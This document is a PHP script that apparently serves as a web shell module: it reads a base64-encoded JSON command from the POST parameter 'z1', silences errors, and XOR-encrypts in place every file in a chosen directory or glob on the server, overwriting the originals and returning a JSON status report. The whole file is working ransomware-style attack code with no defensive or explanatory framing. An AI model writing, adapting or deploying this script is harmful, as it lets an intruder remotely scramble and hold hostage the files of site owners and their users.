<?php

@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(120);

header('Content-Type: text/plain; charset=utf-8');

function xor_transform_file($filePath, $key) {
    if (!file_exists($filePath) || !is_readable($filePath) || !is_writable($filePath)) {
        return array('success' => false, 'details' => 'File not found or permission denied');
    }

    $data = @file_get_contents($filePath);
    if ($data === false) {
        return array('success' => false, 'details' => 'Failed to read file contents');
    }

    $dataLen = strlen($data);
    $keyLen = strlen($key);
    if ($keyLen === 0) {
        return array('success' => false, 'details' => 'XOR Key cannot be empty');
    }

    $output = '';
    for ($i = 0; $i < $dataLen; $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }

    $bytesWritten = @file_put_contents($filePath, $output);
    if ($bytesWritten === false) {
        return array('success' => false, 'details' => 'Failed to write transformed data to file');
    }

    return array('success' => true, 'details' => 'XOR transformation applied successfully (' . $bytesWritten . ' bytes)');
}

function globr($dir) {
    $result = array();
    $root = rtrim($dir, '/\\');
    if (!is_dir($root)) return $result;

    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iter as $item) {
        if ($item->isFile()) {
            $result[] = $item->getPathname();
        }
    }
    return $result;
}

function main() {
    $z1 = $_POST['z1'];
    if (empty($z1)) {
        echo json_encode(array(
            array('file' => 'ERROR', 'action' => 'NONE', 'status' => false, 'details' => 'Missing parameter z1')
        ));
        return;
    }

    $decoded = base64_decode($z1, true);
    $config_raw = ($decoded !== false && $decoded !== '') ? $decoded : $z1;
    $config = json_decode($config_raw, true);

    if (!$config) {
        echo json_encode(array(
            array('file' => 'ERROR', 'action' => 'NONE', 'status' => false, 'details' => 'Invalid JSON configuration')
        ));
        return;
    }

    $action = isset($config['action']) ? $config['action'] : 'encrypt';
    $key = isset($config['key']) ? $config['key'] : '';
    $target = isset($config['target']) ? trim($config['target']) : '';

    if (empty($target)) {
        echo json_encode(array(
            array('file' => 'ERROR', 'action' => $action, 'status' => false, 'details' => 'Target path is empty')
        ));
        return;
    }

    $results = array();
    $targetsList = array();

    if (is_dir($target)) {
        $files = globr($target);
        foreach ($files as $f) {
            if (is_file($f)) $targetsList[] = $f;
        }
    } else if (strpos($target, '*') !== false) {
        $files = glob($target);
        if ($files) {
            foreach ($files as $f) {
                if (is_file($f)) $targetsList[] = $f;
            }
        }
    } else {
        $targetsList[] = $target;
    }

    if (empty($targetsList)) {
        $fullPath = __DIR__ . DIRECTORY_SEPARATOR . $target;
        if (file_exists($fullPath)) {
            $targetsList[] = $fullPath;
        } else {
            $targetsList[] = $target;
        }
    }

    foreach ($targetsList as $filePath) {
        $res = xor_transform_file($filePath, $key);
        $results[] = array(
            'file' => $filePath,
            'action' => $action,
            'status' => $res['success'],
            'details' => $res['details']
        );
    }

    echo json_encode($results);
}

main();

?>